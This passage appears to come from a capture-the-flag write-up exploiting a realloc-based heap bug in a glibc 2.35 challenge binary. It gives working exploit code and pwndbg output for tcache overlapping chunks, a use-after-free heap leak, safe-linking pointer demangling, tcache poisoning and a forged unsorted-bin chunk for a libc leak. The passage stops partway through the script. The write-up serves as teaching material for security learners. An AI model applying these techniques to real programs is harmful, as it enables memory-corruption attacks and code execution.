<li>Suppose that the <code>size</code> that we want to allocate is <code>0x70</code>.</li>
<li>If you do <code>realloc(NULL, 0x70)</code>, if there is a free chunk in the <code>tcache</code> it will use it.</li>
<li>However, if you let say do this sequence:
<ul>
<li><code>a = NULL</code></li>
<li><code>b = NULL</code></li>
<li><code>a = realloc(a, 0x70)</code></li>
<li><code>b = realloc(b, 0x70)</code></li>
<li><code>b = realloc(b, 0)</code> (Free)</li>
<li><code>a = realloc(a, 0x10)</code> (Resize to smaller chunk)</li>
<li><code>a = realloc(a, 0x70)</code> (Resize to bigger chunk)</li>
</ul>
</li>
</ul>
<p>The last <code>realloc</code> didn&rsquo;t want to use entry in <code>tcache</code>. It will create a new <code>0x70</code> chunk. If you run the below script:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="c1"># Free</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Observing in the gdb, the result is like below:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; bins
</span></span><span class="line"><span class="cl">tcachebins
</span></span><span class="line"><span class="cl">0x20 [  1]: 0x55555555a2a0 ◂— 0x0
</span></span><span class="line"><span class="cl">0x60 [  1]: 0x55555555a2c0 ◂— 0x0
</span></span><span class="line"><span class="cl">0x80 [  1]: 0x55555555a320 ◂— 0x0
</span></span><span class="line"><span class="cl">fastbins
</span></span><span class="line"><span class="cl">0x20: 0x0
</span></span><span class="line"><span class="cl">0x30: 0x0
</span></span><span class="line"><span class="cl">0x40: 0x0
</span></span><span class="line"><span class="cl">0x50: 0x0
</span></span><span class="line"><span class="cl">0x60: 0x0
</span></span><span class="line"><span class="cl">0x70: 0x0
</span></span><span class="line"><span class="cl">0x80: 0x0
</span></span><span class="line"><span class="cl">unsortedbin
</span></span><span class="line"><span class="cl">all: 0x0
</span></span><span class="line"><span class="cl">smallbins
</span></span><span class="line"><span class="cl">empty
</span></span><span class="line"><span class="cl">largebins
</span></span><span class="line"><span class="cl">empty
</span></span><span class="line"><span class="cl">pwndbg&gt; heap
</span></span><span class="line"><span class="cl">Allocated chunk | PREV_INUSE
</span></span><span class="line"><span class="cl">Addr: 0x55555555a000
</span></span><span class="line"><span class="cl">Size: 0x291
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Free chunk (tcachebins) | PREV_INUSE
</span></span><span class="line"><span class="cl">Addr: 0x55555555a290
</span></span><span class="line"><span class="cl">Size: 0x21
</span></span><span class="line"><span class="cl">fd: 0x55555555a
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Free chunk (tcachebins) | PREV_INUSE
</span></span><span class="line"><span class="cl">Addr: 0x55555555a2b0
</span></span><span class="line"><span class="cl">Size: 0x61
</span></span><span class="line"><span class="cl">fd: 0x55555555a
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Free chunk (tcachebins) | PREV_INUSE
</span></span><span class="line"><span class="cl">Addr: 0x55555555a310
</span></span><span class="line"><span class="cl">Size: 0x81
</span></span><span class="line"><span class="cl">fd: 0x55555555a
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Allocated chunk | PREV_INUSE
</span></span><span class="line"><span class="cl">Addr: 0x55555555a390
</span></span><span class="line"><span class="cl">Size: 0x81
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Top chunk | PREV_INUSE
</span></span><span class="line"><span class="cl">Addr: 0x55555555a410
</span></span><span class="line"><span class="cl">Size: 0x20bf1
</span></span></code></pre></td></tr></table>
</div>
</div><p>As you can see, the free chunk in the <code>tcache</code> is not used. This piece of information will be useful later during crafting my final exploit.</p>
<p>Another behavior that I discovered is that:</p>
<ul>
<li>Supposed that you have <code>ptr</code> which is a freed chunk with size <code>0x70</code></li>
<li>And then you call <code>realloc(ptr, 0x70)</code> on that freed chunk.</li>
<li>Because the size is the same, <code>realloc</code> won&rsquo;t do nothing to that chunk. So it won&rsquo;t allocate nor free that chunk again.</li>
</ul>
<h4 id="combining-the-bug-with-how-realloc-works">Combining the bug with how <code>realloc</code> works</h4>
<div class="details admonition question open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Question<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">Now that we have played around <code>realloc</code> for a while, time to think on our plan to exploit the bug. Given the bug that it never nullify the entry once it has entered the array, what should we do to abuse this so that we can gain code execution?</div>
        </div>
    </div>
<div class="details admonition note open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-pencil-alt fa-fw" aria-hidden="true"></i>Answer<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">The answer is we need to create overlapping chunks, so that we can trigger <code>Use-After-Free</code>!</div>
        </div>
    </div>
<p>Let&rsquo;s look on the below sequence:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Create Tcache overlapping chunks</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># tcache[0x80] = chunks[0]</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># tcache[0x80] = chunks[1] -&gt; chunks[0]</span>
</span></span><span class="line"><span class="cl"><span class="c1"># This realloc will use the latest chunk in tcache[0x80]. Now, chunks[2] and chunks[1] overlap.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># tcache[0x80] = chunks[0]</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># chunks[2] == chunks[1]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The above will make <code>chunks[1]</code> and <code>chunks[2]</code> pointing to the same address, which mean we have overlapping chunks. Below is the proof:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; tele &amp;mlist 20
</span></span><span class="line"><span class="cl">00:0000│  0x56128da5d040 (mlist) ◂— 0x0
</span></span><span class="line"><span class="cl">01:0008│  0x56128da5d048 (mlist+8) —▸ 0x56128f9d42a0 ◂— 0x56128f9d4
</span></span><span class="line"><span class="cl">02:0010│  0x56128da5d050 (mlist+16) ◂— 0x0
</span></span><span class="line"><span class="cl">03:0018│  0x56128da5d058 (mlist+24) —▸ 0x56128f9d4320 ◂— &#39;aaaaaaaa&#39; // chunks[1]
</span></span><span class="line"><span class="cl">04:0020│  0x56128da5d060 (mlist+32) ◂— 0x70 /* &#39;p&#39; */
</span></span><span class="line"><span class="cl">05:0028│  0x56128da5d068 (mlist+40) —▸ 0x56128f9d4320 ◂— &#39;aaaaaaaa&#39; // chunks[2]
</span></span><span class="line"><span class="cl">06:0030│  0x56128da5d070 (mlist+48) ◂— 0x0
</span></span><span class="line"><span class="cl">07:0038│  0x56128da5d078 (mlist+56) ◂— 0x0
</span></span><span class="line"><span class="cl">08:0040│  0x56128da5d080 (mlist+64) ◂— 0x0
</span></span><span class="line"><span class="cl">09:0048│  0x56128da5d088 (mlist+72) ◂— 0x0
</span></span><span class="line"><span class="cl">0a:0050│  0x56128da5d090 (mlist+80) ◂— 0x0
</span></span><span class="line"><span class="cl">0b:0058│  0x56128da5d098 (mlist+88) ◂— 0x0
</span></span><span class="line"><span class="cl">0c:0060│  0x56128da5d0a0 (mlist+96) ◂— 0x0
</span></span><span class="line"><span class="cl">0d:0068│  0x56128da5d0a8 (mlist+104) ◂— 0x0
</span></span><span class="line"><span class="cl">0e:0070│  0x56128da5d0b0 (mlist+112) ◂— 0x0
</span></span><span class="line"><span class="cl">0f:0078│  0x56128da5d0b8 (mlist+120) ◂— 0x0
</span></span><span class="line"><span class="cl">10:0080│  0x56128da5d0c0 (mlist+128) ◂— 0x0
</span></span><span class="line"><span class="cl">11:0088│  0x56128da5d0c8 (mlist+136) ◂— 0x0
</span></span><span class="line"><span class="cl">12:0090│  0x56128da5d0d0 (mlist+144) ◂— 0x0
</span></span><span class="line"><span class="cl">13:0098│  0x56128da5d0d8 (mlist+152) ◂— 0x0
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now that we have overlapping chunk, we can do so many things.</p>
<h4 id="get-heap-address-leak">Get heap address leak</h4>
<p>Let&rsquo;s start by leaking the heap address. To get a leak, we just need to call <code>realloc(chunks[1], 0)</code>. Notice that the <code>tcache</code> bin linked list will become <code>chunks[1] -&gt; chunks[0]</code>, and the <code>free</code> call on <code>chunks[1]</code> will be considered as success because it is a valid chunk (due to the realloc call during initializing <code>chunks[2]</code>), yet the <code>chunks[2]</code> size stored in the <code>mlist</code> array will be still <code>0x70</code> (Because we call <code>realloc</code> on the <code>chunks[1]</code>, not the <code>chunks[2]</code>. So, the binary only update the size stored in <code>chunks[1]</code>).</p>
<p>You just need to call <code>list</code> and the binary will still print the content of <code>chunks[2]</code>, which now contains a pointer to the <code>chunks[0]</code>. Remember that the <code>libc-2.35</code> mangle the pointer, but it is easy to demangle it. Below is the helper for demangle and mangle it.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Taken from https://ctftime.org/writeup/34804</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">demangle</span><span class="p">(</span><span class="n">val</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">mask</span> <span class="o">=</span> <span class="mh">0xfff</span> <span class="o">&lt;&lt;</span> <span class="mi">52</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">mask</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">v</span> <span class="o">=</span> <span class="n">val</span> <span class="o">&amp;</span> <span class="n">mask</span>
</span></span><span class="line"><span class="cl">        <span class="n">val</span> <span class="o">^=</span> <span class="p">(</span><span class="n">v</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">mask</span> <span class="o">&gt;&gt;=</span> <span class="mi">12</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">val</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">mangle</span><span class="p">(</span><span class="n">heap_addr</span><span class="p">,</span> <span class="n">val</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">heap_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">^</span> <span class="n">val</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s continue our previous script by doing those two reallocs:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># Free chunks[1]. Now, chunks[2] contains mangled heap pointer</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Get the leak via list() feature</span>
</span></span><span class="line"><span class="cl"><span class="n">out</span> <span class="o">=</span> <span class="nb">list</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">leaked_link</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">out</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;[2] &#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">][:</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">leaked_heap</span> <span class="o">=</span> <span class="n">demangle</span><span class="p">(</span><span class="n">leaked_link</span><span class="p">)</span> <span class="c1"># Leaked heap == chunks[0] heap address</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;leaked heap: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_heap</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pause</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>And below is the result:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[*] leaked heap: 0x5634e9da52a0
</span></span><span class="line"><span class="cl">[*] Paused (press any to continue)
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now that we have a leak of the heap address, our next target would be to get a libc leak.</p>
<h4 id="get-libc-address-leak">Get libc address leak</h4>
<p>After thinking it for a while on how to get a libc leak, my approach is to create a fake chunk with size <code>0x420</code>, <code>free</code> it (So that it will go to <code>unsorted bin</code>, and contain libc address), and try to take a look on its content after being freed.</p>
<p>In order to do that, what we need to do:</p>
<ul>
<li>Poison the <code>tcache</code> free list, so that calling <code>realloc</code> will allocate to our desired address for our fake chunk.</li>
<li>Create overlapped chunk on that fake chunk.</li>
<li>Update the metadata of the fake chunk to <code>0x420</code></li>
<li><code>free</code> it. Now the fake chunk will go to <code>unsorted bin</code> and contains libc adress of <code>main_arena+96</code></li>
<li>Now with the overlapped chunk, we will use <code>list</code> to peek its content.</li>
</ul>
<p>Below is the script to do that (continuing our previous script) with self-explanatory comment</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Now, our target is to create a fake chunk with size 0x420, free it, and then peek its content</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="c1"># First, poison the tcache list so that the realloc will allocate a chunk to our fake chunk.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># We will place the fake chunk inside the chunks[0]+0x10, so that the fake chunk metadata will be placed in chunks[0]+0x0,</span>
</span></span><span class="line"><span class="cl"><span class="c1"># which mean we can edit the fake chunk metadata later after it got allocated by calling edit on chunks[0]</span>
</span></span><span class="line"><span class="cl"><span class="n">target_addr</span> <span class="o">=</span> <span class="n">leaked_heap</span><span class="o">+</span><span class="mh">0x10</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">mangle</span><span class="p">(</span><span class="n">target_addr</span><span class="p">,</span> <span class="n">target_addr</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Poison tcache list.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Notes that this realloc will do nothing as chunks[1] size metadata is still the same (0x80), </span>
</span></span><span class="line"><span class="cl"><span class="c1"># which is why the tcache[0x80] won&#39;t be consumed.</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># Will used the tcache entry, which is the same address as chunk[1]</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># Now, chunks[4] = chunks[0]+0x10</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Second, create an overlap chunk with chunks[4].</span>
</span></span><span class="line"><span class="cl"><span class="c1"># We want to overlap chunks[4] and chunks[5].</span>
</span></span><span class="line"><span class="cl"><span class="c1"># But first, fix the metadata of the fake chunk first, so that the size will be set to 0x81</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x81</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span> <span class="c1"># Fix the metadata of the fake chunk by editing the chunks[0]</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="c1"># Now, we can free the chunks[4]. After the free, tcache[0x80] = chunks[4]</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Allocate a new chunks[5], and it will use the latest chunk in tcache[0x80], which is chunks[4].</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="c1"># Now, chunks[5] == chunks[4]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Third, forge the metadata to 0x421</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x421</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span> <span class="c1"># Overwrite the metadata of the fake chunk</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Now, before we free the fake chunk, we need to create two more valid fake chunks after fake_chunk+0x420</span>
</span></span><span class="line"><span class="cl"><span class="c1"># to fulfill the security check implemented in glibc.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># But we don&#39;t have yet chunk which reside on that area (fake_chunk+0x420).</span>
</span></span><span class="line"><span class="cl"><span class="c1"># </span>
</span></span><span class="line"><span class="cl"><span class="c1"># So we need to call multiple realloc on the same chunks first to grow our heap, so that one of our controlled chunk.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># is placed around that area.</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Remember that if we call realloc with the same size, it will do nothing. So, to grow our heap, the trick is</span>
</span></span><span class="line"><span class="cl"><span class="c1"># we will realloc the target chunk to smaller size first, and then realloc it back again to the desired size.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># </span>
</span></span><span class="line"><span class="cl"><span class="c1"># Also, remember that from our experiments, reallocing existing chunk to larger size won&#39;t use any cache</span>
</span></span><span class="line"><span class="cl"><span class="c1"># So, by doing this, we are guaranteed to grow our heap (none of our tcache chunks will be used).</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Now, Observing the gdb, top chunk is placed in fake_chunk+0xf0.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># So, to be able forge two more fake chunks on fake_chunk+0x420, we will need to allocate more.</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="c1"># The above loop will make the top chunk is placed in fake_chunk+0x3f0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Resize it to smaller chunk first before doing the last allocation.</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Now, the below allocation will make the top chunk is placed in fake_chunk+0x470, which is enough</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Specifically, the allocated chunk will be placed in fake_chunk+0x400, and because the chunk size is 0x70, we will</span>
</span></span><span class="line"><span class="cl"><span class="c1"># be able to forge two more fake chunk in area fake_chunk+0x420.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># </span>
</span></span><span class="line"><span class="cl"><span class="c1"># So, our two fake chunks will be placed starting from this_chunk+0x20</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span> <span class="c1"># 0x20 padding</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="c1"># second fake chunk</span>
